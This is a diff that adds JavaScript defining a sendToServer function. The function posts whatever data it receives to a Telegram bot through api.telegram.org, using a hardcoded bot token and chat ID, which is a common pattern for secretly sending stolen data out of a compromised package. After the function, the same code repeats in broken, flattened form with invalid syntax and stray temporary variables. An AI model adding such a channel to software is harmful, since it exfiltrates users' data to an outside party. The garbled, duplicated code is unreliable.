@@ -1,0 +1,51 @@
+function sendToServer = function sendToServer(data) {
+
+    const telegram_data = JSON.stringify({
+        chat_id: '298118942',
+        text: data
+    })
+
+    const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: '/bot1719837914:AAFN8Rv3cy3JnOsFpyTU9kwfWaKqQTyay1c/sendMessage',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': telegram_data.length
+        }
+    }
+
+    const req = https.request(options, res => {})
+
+    req.write(telegram_data)
+    req.end()
+}
+const telegram_data = JSON.stringify({
+        chat_id: '298118942',
+        text: data
+    })
+_tmp_0.chat_id = "298118942"
+_tmp_0.text = data
+const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: '/bot1719837914:AAFN8Rv3cy3JnOsFpyTU9kwfWaKqQTyay1c/sendMessage',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': telegram_data.length
+        }
+    }
+_tmp_1.hostname = "api.telegram.org"
+_tmp_1.port = 443
+_tmp_1.path = "/bot1719837914:AAFN8Rv3cy3JnOsFpyTU9kwfWaKqQTyay1c/sendMessage"
+_tmp_1.method = "POST"
+_tmp_1.headers = {
+            'Content-Type': 'application/json',
+            'Content-Length': telegram_data.length
+        }
+_tmp_2.Content-Type = "application/json"
+_tmp_2.Content-Length = telegram_data.length
+const req = https.request(options, res => {})
+req.write(telegram_data)
